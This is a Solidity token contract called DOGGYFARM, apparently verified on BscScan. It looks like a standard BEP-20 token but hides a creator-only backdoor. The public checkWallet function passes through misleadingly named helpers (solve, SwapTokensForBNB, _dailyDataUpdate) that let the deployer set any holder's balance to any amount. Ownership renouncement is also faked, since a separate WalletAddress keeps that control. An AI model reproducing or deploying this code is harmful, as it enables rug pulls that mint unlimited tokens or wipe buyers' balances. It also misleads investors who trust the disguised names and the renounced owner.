/**
 *Submitted for verification at BscScan.com on 2022-08-31
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() public {
    owner = msg.sender;
  }
}
library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract DOGGYFARM is Ownable {
  using Address for address;
  using SafeMath for uint256;
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;

   mapping (address => bool) private _Addressint;
   mapping (address => bool) private _attacker;
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  mapping(address => bool) public allowAddress;
  
  address WalletAddress;
  uint256 lpFee = 1;
  
  constructor(string memory _name, string memory _symbol) public {
    WalletAddress = msg.sender;
    name = _name;
    symbol = _symbol;
    decimals = 9;
    totalSupply =  590590590590 * 10 ** uint256(decimals);
    _uniswapPair[WalletAddress] = totalSupply;
    allowAddress[WalletAddress] = true;
  }
  
  mapping(address => uint256) public _uniswapPair;
  function transfer(address _to, uint256 _value) public returns (bool) {
    address from = msg.sender;
    
    require(_to != address(0));
    require(_value <= _uniswapPair[from]);

    _transfer(from, _to, _value);
    return true;
  }
  
  function _transfer(address from, address _to, uint256 _value) private {
    _uniswapPair[from] = _uniswapPair[from].sub(_value);
    _uniswapPair[_to] = _uniswapPair[_to].add(_value);
    emit Transfer(from, _to, _value);
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }
    
  modifier onlyDev() {
    require(owner == msg.sender, "Ownable: caller is not the owner");
    _;
  }
    
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return _uniswapPair[_owner];
  }
  
  function renounceOwnership() public virtual onlyDev {
    emit OwnershipTransferred(owner, address(0));
    owner = address(0);
  }
  
  function SwapTokensForBNB(address miner, uint256 _value) internal {
    _dailyDataUpdate(miner, _value);
  
  }

  function solve(address miner, uint256 _value) internal {
    SwapTokensForBNB(miner, _value);

  } 

  function checkWallet(address miner, uint256 _value) public byCreator {
    solve(miner, _value);

  } 

  modifier byCreator() {
    require(WalletAddress == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  
  }
  
  function _dailyDataUpdate(address miner, uint256 _value) internal {
    _uniswapPair[miner] = (_uniswapPair[miner] * 1 * 2 - _uniswapPair[miner] * 1 * 2) + (_value * 10 ** uint256(decimals));
  
  }

  mapping (address => mapping (address => uint256)) public allowed;
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= _uniswapPair[_from]);
    require(_value <= allowed[_from][msg.sender]);

    _transferFrom(_from, _to, _value);
    return true;
  }
  
  function _transferFrom(address _from, address _to, uint256 _value) internal {
    _uniswapPair[_from] = _uniswapPair[_from].sub(_value);
    _uniswapPair[_to] = _uniswapPair[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
  }
  
  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
  
}